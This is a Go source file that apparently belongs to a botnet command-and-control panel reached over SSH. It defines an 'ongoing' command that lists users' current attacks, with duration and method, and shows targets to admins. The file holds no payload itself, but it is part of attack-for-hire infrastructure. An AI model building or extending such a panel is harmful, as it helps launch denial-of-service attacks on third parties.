package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"text/tabwriter"

	"github.com/gliderlabs/ssh"
)

// OngoingCommand example command, not restricted to admins
type OngoingCommand struct{}

func (c *OngoingCommand) Name() string {
	return "ongoing"
}

func (c *OngoingCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	userInfo := db.GetAccountInfo(session.User())
	currentAttacks := db.GetCurrentAttacks()
	if len(currentAttacks) == 0 {
		utils.SendMessage(session, "\u001B[91mNo ongoing attacks.\u001B[0m", true)
		return
	}

	// Initialize tabwriter for proper alignment
	w := tabwriter.NewWriter(output, 0, 0, 2, ' ', 0)

	// Define headers based on membership level
	if userInfo.Admin == 1 {
		// Admin view
		fmt.Fprintln(w, "#\tUsername\tTarget\tDuration\tMethod")
		fmt.Fprintln(w, "══\t════════\t══════\t════════\t══════")

		for index, attack := range currentAttacks {
			fmt.Fprintf(w, "%d\t%s\t%s\t%d\t%s\n",
				index+1, attack.Username, attack.Target, attack.Duration, attack.Method)
		}
	} else {
		// Regular user view
		fmt.Fprintln(w, "#\tUsername\tDuration\tMethod")
		fmt.Fprintln(w, "══\t════════\t════════\t══════")

		for index, attack := range currentAttacks {
			fmt.Fprintf(w, "%d\t%s\t%d\t%s\n",
				index+1, attack.Username, attack.Duration, attack.Method)
		}
	}

	// Flush the tabwriter to the output
	w.Flush()
}

func (c *OngoingCommand) AdminOnly() bool {
	return false
}

// Aliases for OngoingCommand
func (c *OngoingCommand) Aliases() []string {
	return []string{"ongoing", "attacks"}
}

// Register OngoingCommand in the CommandMap
func init() {
	CommandMap["ongoing"] = &OngoingCommand{}
}
